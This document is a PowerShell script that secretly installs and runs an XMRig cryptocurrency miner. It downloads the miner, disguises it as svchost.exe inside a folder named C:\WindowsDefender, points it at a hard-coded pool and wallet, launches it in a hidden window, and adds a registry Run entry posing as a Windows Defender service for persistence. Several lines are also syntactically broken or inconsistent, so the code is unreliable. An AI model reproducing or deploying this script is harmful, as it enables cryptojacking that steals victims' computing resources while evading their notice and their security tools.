$minerFolder = "C:\WindowsDefender"
$exeName = "svchost.exe"
$wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
$pool = "159.203.162.18:3333"
$password = "x"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$zipPath = "$minerFolder\xmrig.zip"
$logFile = "$minerFolder\miner.log"
$configPath = "$minerFolder\config.json"
$startupKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$startupName = "WindowsDefenderService"

# Create miner directory
If (!(Test-Path $minerFolder)) { New-Item -ItemType Directory -Force -Path $minerFolder }

# Download & extract XMRig if needed
If (!(Test-Path "$minerFolder\$exeName")) {
    Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath "$minerFolder\tmp"
    $exe = Get-ChildItem "$minerFolder\tmp" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    If ($exe) { Copy-Item $exe.FullName "$minerFolder\$exeName" }
    Remove-Item "$minerFolder\tmp","$zipPath" -Recurse -Force -ErrorAction SilentlyContinue
}

# Create config.json
$config = @{
    api = @{ "id" = "def" }
    autosave = $true
    randomx = @{ "1gb-pages" = $false; "huge-pages" = $false }
    cpu = @{
        enabled = $true
        max-threads-hint = 20
        priority = 3
    }
    opencl = @{ enabled = $false }
    cuda = @{ enabled = $true; loader = nil }
    pools = @(@{
        url = "$pool"
        user = "$wallet"
        pass = "$password"
        algo = "rx"
        tls = $false
    })
    print-time = 60
    donate-level = 1
    log-file = "$logFile"
}
$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8

# Start miner
Start-Process -FilePath "$minerFolder\$exeName" -WorkingDirectory $minerFolder -WindowStyle Hidden

# Add to startup
Set-ItemProperty -Path $startupKey -Name $startupName -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MyInvocation.MyCommand.Definition`"" -Force
